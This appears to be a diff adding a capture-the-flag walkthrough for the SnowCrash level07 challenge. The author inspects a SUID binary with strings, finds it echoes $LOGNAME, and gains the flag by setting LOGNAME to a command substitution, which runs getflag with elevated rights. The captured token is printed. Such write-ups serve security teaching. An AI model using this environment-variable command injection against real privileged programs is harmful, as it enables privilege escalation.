@@ -1,0 +1,40 @@
+ls -la
+ -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+another SUID script
+
+level07@SnowCrash:~$ ./level07 
+ level07
+level07@SnowCrash:~$ ./level07 test
+ level07
+
+that echoes the same thing
+
+strings level07
+ [...]
+ GLIBC_2.0
+ PTRh 
+ UWVS
+ [^_]
+ LOGNAME
+ /bin/echo %s <== THERE
+ ;*2$"
+ GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
+         gid
+ [...]
+
+
+but this time it's not hardcoded
+"LOGNAME" was though, just above the echo call
+since the script seems to print the $LOGNAME env variable, let's try to change it :
+
+export LOGNAME="GOD"
+./level07 
+ GOD
+
+it does print $LOGNAME
+
+export LOGNAME="\$(getflag)"
+./level07 
+ Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
